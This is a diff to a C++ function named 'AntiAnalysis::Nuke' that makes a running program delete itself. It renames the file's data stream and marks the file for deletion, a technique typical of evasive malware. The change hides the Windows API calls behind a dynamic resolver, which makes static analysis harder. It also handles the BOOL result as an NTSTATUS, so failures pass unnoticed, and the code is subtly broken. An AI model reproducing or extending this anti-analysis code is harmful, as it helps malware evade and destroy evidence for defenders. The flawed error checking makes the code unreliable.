@@ -57,7 +57,7 @@ int AntiAnalysis::Nuke(API::APIResolver& resolver)
     SIZE_T StreamLength = wcslen(NewStream) * sizeof(wchar_t);
     SIZE_T sRename      = sizeof(FILE_RENAME_INFO) + StreamLength;
 
-    auto resolve = resolver.GetAPIAccess();
+    auto api = resolver.GetAPIAccess();
 
     pRename = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename); // Allocate memory for structure
      
@@ -83,8 +83,12 @@ int AntiAnalysis::Nuke(API::APIResolver& resolver)
     if (hFile == INVALID_HANDLE_VALUE) 
         return FALSE;
     
-    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename))
-        return FALSE;
+    if (api.func.pSetFileInformationByHandle)
+    {
+        NTSTATUS status = api.func.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename);
+        if (!NT_SUCCESS(status))
+            return FALSE;
+    }
 
     CloseHandle(hFile);
 
@@ -94,11 +98,13 @@ int AntiAnalysis::Nuke(API::APIResolver& resolver)
     if (hFile == INVALID_HANDLE_VALUE) 
         return FALSE;
     
-
-    // Mark for deletion after file close
-    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &dispinfo, sizeof(dispinfo))) 
-        return FALSE;
     
+    if (api.func.pSetFileInformationByHandle)
+    {
+        NTSTATUS status = api.func.pSetFileInformationByHandle(hFile, FileDispositionInfo, &dispinfo, sizeof(dispinfo));
+        if (!NT_SUCCESS(status))
+            return FALSE;
+    }
 
     CloseHandle(hFile);
     HeapFree(GetProcessHeap(), 0, pRename);
